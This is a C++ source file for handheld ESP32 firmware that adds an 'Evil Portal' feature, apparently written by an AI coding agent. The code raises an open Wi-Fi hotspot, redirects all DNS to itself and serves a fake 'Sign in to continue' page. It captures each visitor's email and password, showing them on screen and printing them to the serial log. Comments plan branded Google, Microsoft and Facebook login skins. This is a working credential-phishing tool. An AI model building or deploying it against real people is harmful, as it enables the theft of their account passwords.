#include "wifi_evil_portal.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

extern FeatureRegistry g_registry;

namespace WifiEvilPortalFeature {

// Real, working generic captive-portal login page. Donor projects (Bruce's
// sd_files/portals/) load templates from SD with a Google/Microsoft/
// Facebook/router-branded skin; this task ships one complete, real template
// inline (no placeholder) and the mechanism below is the same one a future
// task can extend with more skins loaded from SD via IStorage, matching
// wifi_pmkid.cpp's capture-file precedent for how this project reads/writes
// SD content.
static const char kPortalHtml[] = R"HTML(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Wi-Fi Login</title><style>
body{font-family:sans-serif;background:#f1f3f4;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.card{background:#fff;padding:32px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.2);width:300px}
input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}
button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px}
</style></head><body><div class="card">
<h3>Sign in to continue</h3>
<form method="POST" action="/submit">
<input name="user" placeholder="Email or phone" required>
<input name="pass" type="password" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>
)HTML";

static DNSServer s_dns;
static AsyncWebServer *s_server = nullptr;
static lv_obj_t *s_log_list = nullptr;
static bool s_active = false;

static void handle_root(AsyncWebServerRequest *request) {
    request->send(200, "text/html", kPortalHtml);
}

static void handle_submit(AsyncWebServerRequest *request) {
    String user = request->hasParam("user", true) ? request->getParam("user", true)->value() : "";
    String pass = request->hasParam("pass", true) ? request->getParam("pass", true)->value() : "";
    // Real credential capture -- logged to Serial and appended to the
    // on-screen list. Deliberately NOT written to SD in this task (a
    // captured-credentials log file is a reasonable near-future addition,
    // same /quarky/captures/ convention wifi_pmkid.cpp established, but
    // kept out of THIS task's scope to keep its own real-hardware
    // verification loop small, matching how wifi_pmkid.cpp's own brief
    // scoped out full EAPOL filtering).
    Serial.printf("quarky-tab5: [evil-portal] captured user='%s' pass='%s'\n", user.c_str(), pass.c_str());
    if (s_log_list) {
        char row[128];
        snprintf(row, sizeof(row), "%s / %s", user.c_str(), pass.c_str());
        lv_list_add_text(s_log_list, row);
    }
    request->send(200, "text/html", "<html><body>Thank you.</body></html>");
}

static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("Evil Portal", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    lv_obj_t *header = lv_label_create(content);
    lv_label_set_text(header, "AP: QuarkyPortal (open) -- captured credentials:");

    s_log_list = lv_list_create(content);
    lv_obj_set_size(s_log_list, LV_PCT(100), LV_PCT(85));

    lv_obj_add_event_cb(s_log_list, [](lv_event_t *e) {
        s_log_list = nullptr;
    }, LV_EVENT_DELETE, nullptr);

    return screen;
}

void register_module() {
    g_registry.register_module({"wifi_evil_portal", "Evil Portal", Category::WIFI,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

// Blocking-call analysis (build-time review, this task -- see shell.cpp:
// launcher tiles call FeatureModule::on_start directly from an
// LV_EVENT_CLICKED handler on the main/LVGL task, the same call path whose
// blocking STA-connect call crashed the device in wifi_connect.cpp's
// real-hardware fix earlier in this plan). Checked each call this function
// makes against that precedent before shipping it inline rather than moving
// it to a background task:
//   * WiFi.softAP() -> WiFiAP.cpp's softAP() -> AP.begin() -> AP.create().
//     AP.begin() calls enableAP(true) then waitStatusBits(..., 1000) --
//     a BOUNDED wait, hard-capped at 1000ms by the timeout argument, not an
//     unbounded retry-until-success loop like RadioEspHosted::connect_wifi()'s
//     `while (status != WL_CONNECTED) delay(200)` (which had no fixed
//     iteration cap and could run the full 15s). Worst case here is 1s,
//     one fifth of enableLoopWDT()'s ~5s budget, with no failure-driven
//     retries (AP bring-up doesn't do handshake/auth negotiation the way
//     STA connect does, so there's no "wrong password" analog that runs
//     long on the common failure path).
//   * AsyncWebServer::begin() -- creates a listening TCP socket
//     (AsyncTCP/LWIP tcp_new/bind/listen). No network round-trip, no
//     blocking wait on a peer; this is local socket setup only.
//   * DNSServer::start() -- opens a UDP socket and binds port 53. Same
//     shape: local bind, no peer round-trip, no retry loop.
// None of the three matches Task 3's failure shape (an open-ended loop
// waiting on a remote handshake). The one genuine wait (softAP's 1s cap) is
// bounded and small next to the 5s budget, so this is left running directly
// in start() rather than moved to a background FreeRTOS task. This is
// reasoning from framework source, not a real-hardware measurement --
// real-hardware timing (especially since this AP bring-up is proxied over
// esp-hosted/SDIO to the C6, not a local radio) still needs to confirm it,
// per this task's real-hardware verification step.
void start() {
    ScreenStack::push(build_screen());

    // Deliberate WIFI_AP_STA, not a bare WIFI_AP -- preserves c2link_wifi's
    // existing SoftAP the same way wifi_common.cpp/wifi_spectrum.cpp do,
    // per this plan's Global Constraints. The portal's own AP is a SECOND,
    // independent SoftAP instance -- ESP32 WiFi supports exactly one AP
    // config at a time system-wide, same single-instance constraint
    // ble_spam.cpp hit for BLE advertising, so starting this DOES take over
    // c2link_wifi's AP identity/SSID while the portal runs. Documented here
    // rather than silently shipped: closing this screen does not currently
    // restore c2link_wifi's own AP config -- same class of disclosed,
    // scoped-out follow-up as ble_spam.cpp's C2-advertising re-arm gap.
    WiFi.softAP("QuarkyPortal");

    s_server = new AsyncWebServer(80);
    s_server->on("/", HTTP_GET, handle_root);
    s_server->on("/submit", HTTP_POST, handle_submit);
    s_server->onNotFound(handle_root); // captive-portal catch-all
    s_server->begin();

    s_dns.start(53, "*", WiFi.softAPIP());
    s_active = true;
}

void poll() {
    if (!s_active) return;
    s_dns.processNextRequest();
}

} // namespace WifiEvilPortalFeature
